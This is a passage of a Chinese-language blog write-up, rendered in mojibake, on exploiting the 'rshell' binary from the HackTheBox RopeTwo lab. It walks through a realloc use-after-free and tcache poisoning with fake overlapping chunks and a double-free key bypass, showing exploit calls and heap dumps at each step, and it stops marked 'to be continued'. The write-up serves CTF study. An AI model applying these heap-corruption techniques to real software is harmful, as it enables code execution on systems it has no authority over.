<th align="left">å¤§å°æ¯”è¾ƒ</th>
<th align="left">é‡‡å–åŠ¨ä½œ</th>
</tr>
</thead>
<tbody><tr>
<td align="left">new_size == 0</td>
<td align="left">free(buffer), return null</td>
</tr>
<tr>
<td align="left">new_size &gt; 0 &amp;&amp; new_size &lt; orig_size</td>
<td align="left">åˆ†æˆä¸¤ä¸ªå—ï¼Œè¿”å›ç›¸åŒçš„åœ°å€å’Œæ›´å°çš„å—ï¼Œå¹¶åœ¨æ—§å—çš„æœ«å°¾ç•™ä¸‹ç©ºé—²å—</td>
</tr>
<tr>
<td align="left">new_size &gt; 0 &amp;&amp; new_size &gt; orig_size</td>
<td align="left">é‡Šæ”¾æ—§å—ï¼Œä¸ºæ›´å¤§çš„å—åˆ†é…æ–°å—ï¼Œå¹¶è¿”å›è¯¥åœ°å€ã€‚</td>
</tr>
</tbody></table>
<p>ä¸Šé¢çš„ä»£ç æ£€æŸ¥è¿”å›å€¼æ˜¯å¦ä¸ºnullï¼Œä½†éšååªæ‰“å°ä¸€æ¡æ¶ˆæ¯ï¼Œè€Œä¸æ›´æ”¹å­˜å‚¨çš„æŒ‡é’ˆã€‚è¿™ä¼šç»™ç”¨æˆ·ç•™ä¸‹ä¸€ä¸ªæŒ‡å‘å·²é‡Šæ”¾å†…å­˜çš„æŒ‡é’ˆï¼Œè¿™æ˜¯å¾ˆç³Ÿç³•çš„ã€‚</p>
<ul>
<li>ä¾‹å­</li>
</ul>
<p>ä¸ºäº†çœ‹åˆ°è¿™ä¸€ç‚¹ï¼Œå°†è¿è¡Œä»¥ä¸‹ä»£ç :</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">(Pdb) add(<span class="string">&#x27;1&#x27;</span>, 0x50)</span><br><span class="line">b<span class="string">&#x27;$ &#x27;</span></span><br><span class="line">(Pdb) add(<span class="string">&#x27;2&#x27;</span>, 0x50)</span><br><span class="line">b<span class="string">&#x27;$ &#x27;</span></span><br><span class="line">(Pdb) rm(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">(Pdb) edit(<span class="string">&#x27;2&#x27;</span>, 0)</span><br></pre></td></tr></table></figure>

<p>è¿™æ ·å°±å‰©ä¸‹äº†ä»¥ä¸‹å†…å®¹(&lt;â€“ ç”±æˆ‘æ·»åŠ ):</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">-----------------------------------</span><br><span class="line">[0x0000000000000000]         : (null)</span><br><span class="line">[0x000055555555c2c0] 2       : `UUUU                        &lt;-- still have pointer to chunk2</span><br><span class="line">-----------------------------------</span><br><span class="line">0x55555555c250: 0x0000000000000000      0x0000000000000061  &lt;-- freed chunk 1</span><br><span class="line">0x55555555c260: 0x0000000000000000      0x000055555555c010  &lt;-- tcache pointer null, key</span><br><span class="line">0x55555555c270: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x55555555c280: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x55555555c290: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x55555555c2a0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x55555555c2b0: 0x0000000000000000      0x0000000000000061  &lt;-- freed chunk 2</span><br><span class="line">0x55555555c2c0: 0x000055555555c260      0x000055555555c010  &lt;-- tcache pointer to freed 1, key</span><br><span class="line">0x55555555c2d0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x55555555c2e0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x55555555c2f0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x55555555c300: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x55555555c310: 0x0000000000000000      0x0000000000020cf1  &lt;-- end of heap</span><br><span class="line">...[snip]...</span><br><span class="line">-----------------------------------</span><br><span class="line">...[snip]...</span><br><span class="line">                  top: 0x55555555c310 (size : 0x20cf0) </span><br><span class="line">       last_remainder: 0x0 (size : 0x0) </span><br><span class="line">            unsortbin: 0x0</span><br><span class="line">(0x60)   tcache_entry[4](2): 0x55555555c2c0 --&gt; 0x55555555c260  &lt;-- both chunks <span class="keyword">in</span> tcache list</span><br></pre></td></tr></table></figure>

<p>è¿™æ˜¯å¯åˆ©ç”¨çš„ï¼Œå› ä¸ºè¿˜æœ‰ä¸€ä¸ªæŒ‡å‘edit2çš„æŒ‡é’ˆï¼Œå°½ç®¡å®ƒå·²ç»è¢«é‡Šæ”¾äº†ã€‚è¿™æ„å‘³ç€å¯ä»¥é€šè¿‡ç¼–è¾‘2æ¥æ›´æ”¹tcacheé“¾è¡¨ã€‚</p>
<h2 id="åœ¨å †ä¸Šå¾—åˆ°libc"><a href="#åœ¨å †ä¸Šå¾—åˆ°libc" class="headerlink" title="åœ¨å †ä¸Šå¾—åˆ°libc"></a>åœ¨å †ä¸Šå¾—åˆ°libc</h2><ul>
<li>ç­–ç•¥</li>
</ul>
<p>ä»è¿™ä¸ªå°æ¼æ´åˆ°ä»£ç æ‰§è¡Œçš„è·¯å¾„å¹¶ä¸æ˜æ˜¾ã€‚å› ä¸ºASLRï¼Œéœ€è¦åšçš„ç¬¬ä¸€ä»¶äº‹å°±æ˜¯ä»libcæ³„éœ²ä¸€äº›ä¿¡æ¯ã€‚è¦åšåˆ°è¿™ä¸€ç‚¹ï¼Œé¦–å…ˆéœ€è¦ä»libcè·å¾—ä¸€äº›ä¸œè¥¿åˆ°å †ä¸Šã€‚å½“é‡Šæ”¾è¿™äº›binsæ—¶ï¼Œå®ƒä»¬å°†è¿›å…¥tcacheï¼Œè¿™æ˜¯ä¸€å †ä»libcå¼€å§‹çš„å•é“¾è¡¨ï¼Œç„¶ååˆ—è¡¨å®¹å™¨ä¸­çš„æ¯ä¸€é¡¹éƒ½æ˜¯æŒ‡å‘ä¸‹ä¸€é¡¹çš„æŒ‡é’ˆã€‚ä½†å…¶ä»–ç±»å‹æ˜¯åŒé“¾è¡¨ã€‚è¿™æ„å‘³ç€æ¯ä¸ªèŠ‚ç‚¹æ—¢æŒ‡å‘å®ƒåé¢çš„èŠ‚ç‚¹ï¼Œä¹ŸæŒ‡å‘å®ƒå‰é¢çš„èŠ‚ç‚¹ï¼Œå› æ­¤ç¬¬ä¸€ä¸ªèŠ‚ç‚¹åœ¨libcä¸­å…·æœ‰èµ·å§‹èŠ‚ç‚¹çš„åœ°å€ã€‚å¯ä»¥é€šè¿‡ç”¨7ä¸ªç»™å®šå¤§å°çš„binså¡«å……tcacheï¼Œç„¶åå†é‡Šæ”¾ä¸€ä¸ªbinï¼Œå°†ä¸€äº›ä¸œè¥¿æ”¾å…¥æœªæ’åºçš„binsä¸­ã€‚</p>
<p>è¿™å°†éœ€è¦å¤§é‡çš„è·³è·ƒï¼Œå½“è¢«é™åˆ¶åœ¨åªæœ‰ä¸¤ä¸ªâ€œæ–‡ä»¶â€çš„ç¨‹åºåœ¨åŒä¸€æ—¶é—´ã€‚</p>
<ul>
<li>é—´è·</li>
</ul>
<p>ASLRå’ŒFull RELROå°†æ”¹å˜æ¯ä¸ªå•è¯é™¤äº†ä½12ä½ä»¥å¤–çš„æ‰€æœ‰å†…å®¹ã€‚å¯ä»¥ä¸€éåˆä¸€éåœ°è¿è¡Œç¨‹åºï¼Œåªè¦ä»¥ç›¸åŒçš„é¡ºåºå®šä¹‰ç›¸åŒçš„å—ï¼Œæ¯ä¸ªåœ°å€çš„ä½12ä½å°†æ˜¯ç›¸åŒçš„ã€‚è¿™æ„å‘³ç€å¯ä»¥æ‰¾åˆ°ä¸€äº›åœ°æ–¹ï¼Œåœ¨é‚£é‡Œå¯ä»¥åªè¦†ç›–åœ°å€ä¸­çš„ä½å­—èŠ‚ï¼Œä»è€Œåœ¨ä¸çŸ¥é“é«˜å­—èŠ‚çš„æƒ…å†µä¸‹æ›´æ”¹å®ƒã€‚è¿™ä¹Ÿæ„å‘³ç€æœ‰äº›æ—¶å€™æƒ³ä»æŸä¸ªç‰¹å®šçš„ç©ºé—´å¼€å§‹ã€‚å¦‚æœåœ¨0x2e0å¤„åˆ›å»ºäº†ä¸€ä¸ªå‡å—ï¼Œå¹¶ä¸”ä¸èƒ½è¦†ç›–å½“å‰æŒ‡å‘0x320çš„æŒ‡é’ˆã€‚ä½†æ˜¯å¦‚æœåœ¨å¼€å§‹æ—¶åªå‘å †ä¸­æ·»åŠ ä¸€å°å—ï¼Œå¹¶å°†å®ƒä»¬ç§»åˆ°0x310å’Œ0x350ï¼Œç°åœ¨å¯ä»¥ç”¨0x10è¦†ç›–è¾ƒä½çš„0x50ã€‚</p>
<ul>
<li>å‡å—</li>
</ul>
<p>åˆ›å»ºä¸€ä¸ªå‡çš„é‡å å—ï¼Œå®ƒå¯ä»¥å†™å…¥ä¸‹ä¸€ä¸ªå—çš„å…ƒæ•°æ®ã€‚å¯ä»¥åœ¨ä¸Šé¢çš„ç¤ºä¾‹ä¸­é€‰æ‹©ï¼Œä½†ä¸æ˜¯ç¬¬ä¸€ä¸ªå—å†™å…¥ä»»ä½•æ„Ÿå…´è¶£çš„å†…å®¹ï¼Œè€Œæ˜¯è®©å®ƒå†™å…¥ä¸€äº›çœ‹èµ·æ¥åƒå †å…ƒæ•°æ®çš„å†…å®¹ï¼Œä¾‹å¦‚ï¼Œ0x61:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="string">&#x27;A&#x27;</span>, 0x40, p64(0)*5 + p64(0x61) + p64(0))   <span class="comment"># A at 260 in f1</span></span><br><span class="line">add(<span class="string">&#x27;B&#x27;</span>, 0x40)                                  <span class="comment"># B at 2b0 in f2</span></span><br></pre></td></tr></table></figure>

<p>å½“è¿è¡Œè¿™ä¸ªæ—¶ï¼Œå †çœ‹èµ·æ¥åƒ:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">0x55555555c250: 0x0000000000000000      0x0000000000000051  &lt;-- A meta</span><br><span class="line">0x55555555c260: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x55555555c270: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x55555555c280: 0x0000000000000000      0x0000000000000061  &lt;-- data, but looks like heap meta</span><br><span class="line">0x55555555c290: 0x0000000000000000      0x000000000000000a</span><br><span class="line">0x55555555c2a0: 0x0000000000000000      0x0000000000000051  &lt;-- B meta</span><br><span class="line">0x55555555c2b0: 0x0000000000000a78      0x0000000000000000  &lt;-- B data</span><br><span class="line">0x55555555c2c0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x55555555c2d0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x55555555c2e0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x55555555c2f0: 0x0000000000000000      0x0000000000020d11  &lt;-- end of heap</span><br></pre></td></tr></table></figure>

<p>é‡Šæ”¾Aï¼Œç„¶åé‡Šæ”¾Bï¼ŒæŠŠå®ƒç¼–è¾‘ä¸º0ã€‚ç„¶ååœ¨æ·»åŠ å¦ä¸€ä¸ª0x40 binæ—¶ï¼Œå°†ä½¿ä¸¤ä¸ªæ–‡ä»¶æŒ‡å‘åŒä¸€ä¸ªä½ç½®ã€‚ä»è¿™é‡Œå¼€å§‹ï¼Œç§»é™¤ç¬¬ä¸€ä¸ªBå°†ä¼šè¿›å…¥æƒ³è¦æ”»å‡»çš„åœ°æ–¹:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">rm(<span class="string">&#x27;A&#x27;</span>)                                         <span class="comment"># A in 0x50 tcache, f1 empty</span></span><br><span class="line">edit(<span class="string">&#x27;B&#x27;</span>, 0)                                    <span class="comment"># B -&gt; A in 0x50 tcache, f2 still B</span></span><br><span class="line">add(<span class="string">&#x27;B2&#x27;</span>, 0x40)                                 <span class="comment"># A in 0x50 tcache, f1 &amp; f2 -&gt; B</span></span><br><span class="line">rm(<span class="string">&#x27;B&#x27;</span>)                                         <span class="comment"># B -&gt; A in 0x50 tcache, f1 -&gt; B</span></span><br></pre></td></tr></table></figure>

<p>å †å¾ªç¯å¦‚ä¸‹:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">0x55555555c250: 0x0000000000000000      0x0000000000000051  &lt;-- A meta</span><br><span class="line">0x55555555c260: 0x0000000000000000      0x000055555555c010  &lt;-- A pointer to next (null) and key</span><br><span class="line">0x55555555c270: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x55555555c280: 0x0000000000000000      0x0000000000000061  &lt;-- fake chunk</span><br><span class="line">0x55555555c290: 0x0000000000000000      0x000000000000000a</span><br><span class="line">0x55555555c2a0: 0x0000000000000000      0x0000000000000051  &lt;-- B meta</span><br><span class="line">0x55555555c2b0: 0x000055555555c260      0x000055555555c010  &lt;-- pointer to A and key</span><br><span class="line">0x55555555c2c0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x55555555c2d0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x55555555c2e0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x55555555c2f0: 0x0000000000000000      0x0000000000020d11</span><br></pre></td></tr></table></figure>

<p>å½“ç°åœ¨ç”¨ä¸€ä¸ªå­—ç¬¦ç¼–è¾‘B2, 0x90ï¼Œå®ƒå°†è¦†ç›–tcacheæŒ‡é’ˆ:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">edit(<span class="string">&#x27;B2&#x27;</span>, 0x40, <span class="string">&#x27;\x90&#x27;</span>)                        <span class="comment"># B -&gt; fake1 in 0x50 tcache, f1 -&gt; B</span></span><br></pre></td></tr></table></figure>
<p>Heap:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">0x55555555c250: 0x0000000000000000      0x0000000000000051</span><br><span class="line">0x55555555c260: 0x0000000000000000      0x000055555555c010</span><br><span class="line">0x55555555c270: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x55555555c280: 0x0000000000000000      0x0000000000000061</span><br><span class="line">0x55555555c290: 0x0000000000000000      0x000000000000000a</span><br><span class="line">0x55555555c2a0: 0x0000000000000000      0x0000000000000051</span><br><span class="line">0x55555555c2b0: 0x000055555555c290      0x000055555555c010  &lt;-- now points to fake chunk</span><br><span class="line">0x55555555c2c0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x55555555c2d0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x55555555c2e0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x55555555c2f0: 0x0000000000000000      0x0000000000020d11</span><br></pre></td></tr></table></figure>

<p>heapinfoä¹Ÿæ˜¾ç¤ºäº†è¿™ä¸ª:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(0x50)   tcache_entry[3](2): 0x55555555c2b0 --&gt; 0x55555555c290 (overlap chunk with 0x55555555c2a0(freed) )</span><br></pre></td></tr></table></figure>

<p>å¦‚æœæƒ³è¦è®¿é—®è¿™ä¸ªå—ï¼Œé¦–å…ˆéœ€è¦å»æ‰2b0ã€‚ä¸èƒ½æŠŠå®ƒæ‹¿å‡ºæ¥é‡Šæ”¾ï¼Œå¦åˆ™å®ƒä¼šå›åˆ°åŸæ¥çš„åœ°æ–¹ã€‚æ‰€ä»¥ä¼šå¾—åˆ°å®ƒï¼ŒæŠŠå®ƒç¼–è¾‘æˆæ›´å°çš„å¤§å°ï¼Œç„¶åé‡Šæ”¾å®ƒï¼Œè®©ä¸¤ä¸ªæ›´å°çš„å—è¿›å…¥tcacheï¼Œç•™ä¸‹å‡å—å‡†å¤‡å¥½è¢«ä½¿ç”¨ã€‚</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="string">&#x27;B3&#x27;</span>, 0x40)                                 <span class="comment"># fake in 0x50 tcache, f2 -&gt; B</span></span><br><span class="line">edit(<span class="string">&#x27;B3&#x27;</span>, 0x20)                                <span class="comment"># B-end in 0x20 tcache</span></span><br><span class="line">rm(<span class="string">&#x27;B3&#x27;</span>)                                        <span class="comment"># B in 0x30 tcache</span></span><br></pre></td></tr></table></figure>

<p>ç°åœ¨ï¼Œå°†æ·»åŠ ä¸€ä¸ª0x40æ¡ç›®ï¼Œå®ƒå°†è¿”å›290ï¼Œå¯ä»¥ä½¿ç”¨å®ƒè¦†ç›–åˆ°bä¸­ã€‚åœ¨è¿™æ ·åšä¹‹å‰ï¼Œæœ‰å¦ä¸€ä¸ªé—®é¢˜ã€‚æƒ³é‡Šæ”¾B2ï¼Œä½†ä¸èƒ½ï¼Œå› ä¸ºå®ƒä¼šè¿”å›ä¸€ä¸ªåŒè‡ªç”±é”™è¯¯ã€‚å®ƒæ­£åœ¨æ£€æŸ¥sizeå…ƒæ•°æ®åé¢0x10çš„é”®ï¼Œæ‰€ä»¥éœ€è¦æ›´æ”¹å®ƒã€‚å¹¸è¿çš„æ˜¯ï¼Œæœ‰äº†æ–°çš„é‡å éƒ¨åˆ†ã€‚å› æ­¤ï¼Œå°†åˆ›å»ºå®ƒï¼Œä½¿å®ƒä¿æŒ0x51ä¸å˜ï¼Œä¸ºä¸‹ä¸€ä¸ªtcacheæ·»åŠ ä¸€ä¸ªnullï¼Œå¹¶æ›´æ”¹é”®ã€‚</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="string">&#x27;fake1&#x27;</span>, 0x40, p64(0)*3 + p64(0x51) + p64(0))</span><br></pre></td></tr></table></figure>

<p>ç°åœ¨å †æ˜¾ç¤ºkeyä¸å†åŒ¹é…åå€¼:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">0x55555555c250: 0x0000000000000000      0x0000000000000051</span><br><span class="line">0x55555555c260: 0x0000000000000000      0x000055555555c010</span><br><span class="line">0x55555555c270: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x55555555c280: 0x0000000000000000      0x0000000000000061</span><br><span class="line">0x55555555c290: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x55555555c2a0: 0x0000000000000000      0x0000000000000051</span><br><span class="line">0x55555555c2b0: 0x0000000000000000      0x000055555555000a  &lt;-- no pointer and key ends <span class="keyword">in</span> <span class="string">&quot;\x00\x0a&quot;</span> and not <span class="string">&quot;\xc0\x10&quot;</span></span><br><span class="line">0x55555555c2c0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x55555555c2d0: 0x0000000000000000      0x0000000000000021</span><br><span class="line">0x55555555c2e0: 0x0000000000000000      0x000055555555c010</span><br><span class="line">0x55555555c2f0: 0x0000000000000000      0x0000000000020d11</span><br></pre></td></tr></table></figure>

<p>å°†é‡Šæ”¾B2å’Œfake1ï¼Œå®ƒä»¬éƒ½è¿›å…¥tcacheï¼Œéœ€è¦ä¸€ç§å‘ä»»æ„åœ°å€å†™å…¥çš„æ–¹æ³•æ—¶ï¼Œå¯ä»¥åœ¨æœ€åä½¿ç”¨å®ƒä»¬ã€‚</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">rm(<span class="string">&#x27;fake1&#x27;</span>)</span><br><span class="line">rm(<span class="string">&#x27;B2&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>tcacheç°åœ¨çœ‹èµ·æ¥åƒ:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">(0x20)   tcache_entry[0](1): 0x55555555c2e0</span><br><span class="line">(0x30)   tcache_entry[1](1): 0x55555555c2b0 (overlap chunk with 0x55555555c2d0(freed) )</span><br><span class="line">(0x50)   tcache_entry[3](1): 0x55555555c2b0 (overlap chunk with 0x55555555c2d0(freed) )</span><br><span class="line">(0x60)   tcache_entry[4](1): 0x55555555c290 (overlap chunk with 0x55555555c2d0(freed) )</span><br></pre></td></tr></table></figure>

<ul>
<li>ç¬¬äºŒå‡å—</li>
</ul>
<p>ç°åœ¨ï¼Œå°†ç”¨å¤§è‡´ç›¸åŒçš„æ–¹å¼åˆ›å»ºå¦ä¸€ä¸ªå‡å— (åœ¨é—´éš”ä¸€äº›æ—¶é—´ä¹‹å):</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>

<p>æœªå®ŒæŒç»­ã€‚ã€‚ã€‚</p>

    </div>

    
    
    
        <div class="reward-container">
  <div></div>
  <button onclick="var qr = document.getElementById('qr'); qr.style.display = (qr.style.display === 'none') ? 'block' : 'none';">
    Donate
  </button>
  <div id="qr" style="display: none;">
      
      <div style="display: inline-block;">
        <img src="/images/wechatpay.png" alt="lUc1f3r11 WeChat Pay">
        <p>WeChat Pay</p>
      </div>
      
      <div style="display: inline-block;">
        <img src="/images/alipay.png" alt="lUc1f3r11 Alipay">
        <p>Alipay</p>
      </div>

  </div>
</div>

        

<div>
<ul class="post-copyright">
  <li class="post-copyright-author">
    <strong>Post author:  </strong>lUc1f3r11
  </li>
  <li class="post-copyright-link">
    <strong>Post link: </strong>
    <a href="https://fdlucifer.github.io/2021/02/18/hackthebox-rope2-rshell-exploit/" title="HackTheBox-RopeTwo-[pwn-rshell]">https://fdlucifer.github.io/2021/02/18/hackthebox-rope2-rshell-exploit/</a>
  </li>
  <li class="post-copyright-license">
    <strong>Copyright Notice:  </strong>All articles in this blog are licensed under <span class="exturl" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC8="><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</span> unless stating additionally.
  </li>
</ul>
</div>

        

  <div class="followme">
    <p>Welcome to my other publishing channels</p>

    <div class="social-list">

        <div class="social-item">
          <a target="_blank" class="social-link" href="https://twitter.com/fdlucifer11">
            <span class="icon">
              <i class="fab fa-twitter"></i>
            </span>

            <span class="label">Twitter</span>
          </a>
        </div>

        <div class="social-item">
          <a target="_blank" class="social-link" href="https://t.me/FDkiller">
            <span class="icon">
              <i class="fab fa-telegram"></i>
            </span>

            <span class="label">Telegram</span>
          </a>
        </div>

        <div class="social-item">
          <a target="_blank" class="social-link" href="/images/wechat_channel.jpg">
            <span class="icon">
              <i class="fab fa-weixin"></i>
            </span>

            <span class="label">WeChat</span>
          </a>
        </div>
    </div>
  </div>


      <footer class="post-footer">
          <div class="post-tags">
              <a href="/tags/pwn/" rel="tag"># pwn</a>
          </div>

        


        
    <div class="post-nav">
      <div class="post-nav-item">
    <a href="/2021/02/15/Exploiting-the-Math-expm1-typing-bug-in-V8/" rel="prev" title="åˆ©ç”¨V8ä¸­çš„Math-expm1-typingæ¼æ´">
      <i class="fa fa-chevron-left"></i> åˆ©ç”¨V8ä¸­çš„Math-expm1-typingæ¼æ´
    </a></div>
      <div class="post-nav-item"></div>
    </div>
      </footer>
    
  </article>
  
  
  



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          Table of Contents
        </li>
        <li class="sidebar-nav-overview">
          Overview
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-number">1.</span> <span class="nav-text">å‰è¨€</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%8B%E8%BD%BDbinary%E6%96%87%E4%BB%B6%E5%88%86%E6%9E%90"><span class="nav-number">2.</span> <span class="nav-text">ä¸‹è½½binaryæ–‡ä»¶åˆ†æ</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%BB%E8%A6%81%E5%BE%AA%E7%8E%AF"><span class="nav-number">3.</span> <span class="nav-text">ä¸»è¦å¾ªç¯</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Commands"><span class="nav-number">4.</span> <span class="nav-text">Commands</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%85%8D%E7%BD%AE"><span class="nav-number">5.</span> <span class="nav-text">é…ç½®</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%94%BE%E5%9C%A8%E4%B8%80%E8%B5%B7"><span class="nav-number">6.</span> <span class="nav-text">æ”¾åœ¨ä¸€èµ·</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%B3%A8%E9%87%8A"><span class="nav-number">7.</span> <span class="nav-text">æ³¨é‡Š</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%BC%B1%E7%82%B9"><span class="nav-number">8.</span> <span class="nav-text">å¼±ç‚¹</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%9C%A8%E5%A0%86%E4%B8%8A%E5%BE%97%E5%88%B0libc"><span class="nav-number">9.</span> <span class="nav-text">åœ¨å †ä¸Šå¾—åˆ°libc</span></a></li></ol></div>
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="lUc1f3r11"
      src="/images/lucifer11.jpg">
  <p class="site-author-name" itemprop="name">lUc1f3r11</p>
  <div class="site-description" itemprop="description">all things about infosec & ctf</div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">132</span>
          <span class="site-state-item-name">posts</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
            <a href="/categories/">
          
        <span class="site-state-item-count">29</span>
        <span class="site-state-item-name">categories</span></a>
      </div>
      <div class="site-state-item site-state-tags">
            <a href="/tags/">
          
        <span class="site-state-item-count">39</span>
        <span class="site-state-item-name">tags</span></a>
      </div>
  </nav>
</div>
  <div class="links-of-author motion-element">
      <span class="links-of-author-item">
        <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0ZEbHVjaWZlcg==" title="GitHub â†’ https:&#x2F;&#x2F;github.com&#x2F;FDlucifer"><i class="fab fa-github fa-fw"></i>GitHub</span>
      </span>
      <span class="links-of-author-item">
        <span class="exturl" data-url="bWFpbHRvOjExODUxNTE4NjdAcXEuY29t" title="E-Mail â†’ mailto:1185151867@qq.com"><i class="fa fa-envelope fa-fw"></i>E-Mail</span>
      </span>
      <span class="links-of-author-item">
        <span class="exturl" data-url="aHR0cHM6Ly90d2l0dGVyLmNvbS9mZGx1Y2lmZXIxMQ==" title="Twitter â†’ https:&#x2F;&#x2F;twitter.com&#x2F;fdlucifer11"><i class="fab fa-twitter fa-fw"></i>Twitter</span>
      </span>
      <span class="links-of-author-item">
